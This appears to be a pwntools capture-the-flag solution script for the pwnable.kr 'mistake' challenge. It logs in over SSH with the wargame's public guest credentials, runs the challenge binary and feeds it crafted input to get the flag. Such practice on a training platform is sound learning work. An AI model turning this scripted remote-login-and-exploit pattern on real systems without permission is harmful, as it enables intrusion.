from pwn import *

session = ssh(host='pwnable.kr', user='mistake', port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1":""})
io.recvrepeat(1)
io.sendline("./mistake")
io.recvrepeat(1).decode()
io.sendline('B'*10)
io.sendline('C'*10)
print(io.recvrepeat(1).decode())